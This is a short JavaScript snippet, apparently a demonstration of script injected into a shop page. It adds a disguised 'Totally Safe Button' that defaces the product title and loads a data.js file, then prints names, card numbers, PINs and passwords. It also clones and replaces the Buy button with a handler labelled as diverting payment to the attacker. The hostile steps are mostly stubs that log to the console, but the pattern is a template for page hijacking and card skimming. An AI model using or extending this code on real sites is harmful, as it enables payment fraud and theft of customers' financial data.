// Only create hack button if it doesn't exist
if (!document.querySelector('#hack-button')) {
  const hackButton = document.createElement('button');
  hackButton.textContent = 'Totally Safe Button';
  hackButton.id = 'hack-button';

  // Match the exact styling of the Buy button
  hackButton.style.cssText = `
      background-color: #444;
      color: white;
      width: 250px;
      padding: 1em;
      border: none;
      border-radius: 5px;
      font-size: 1.5em;
      cursor: pointer;
      font-family: 'Poppins', sans-serif;
      margin-top: 10px;
      display: block;
  `;

  const buyButton = document.getElementById('prod-buy');
  buyButton.parentNode.insertBefore(hackButton, buyButton.nextSibling);

  hackButton.addEventListener('click', () => {
    console.log('You have been hacked 🏴‍☠️');
    const productTitle = document.querySelector('.prod-title');
    if (productTitle) {
      productTitle.textContent = 'Do not buy this';
    }

    // Create a script element to load data.js
    const dataScript = document.createElement('script');
    dataScript.src = 'data.js';
    dataScript.onload = () => {
      console.log('💳 EXPOSED CREDIT CARD DATA 💳');
      if (typeof ccData !== 'undefined') {
        ccData.forEach((person) => {
          console.log(`
                  Name: ${person.firstName} ${person.lastName}
                  Bank: ${person.bank}
                  Card Number: ${person.cardNumber}
                  Sort Code: ${person.sortCode}
                  PIN: ${person.pin}
                  Password: ${person.password}
                  ----------------------`);
        });
      }
    };
    document.head.appendChild(dataScript);
  });
}

// Hijack the Buy button
const buyButton = document.getElementById('prod-buy');
const newBuyButton = buyButton.cloneNode(true);
buyButton.parentNode.replaceChild(newBuyButton, buyButton);

newBuyButton.addEventListener('click', () => {
  console.log('diverting payment to my account 💰');
});
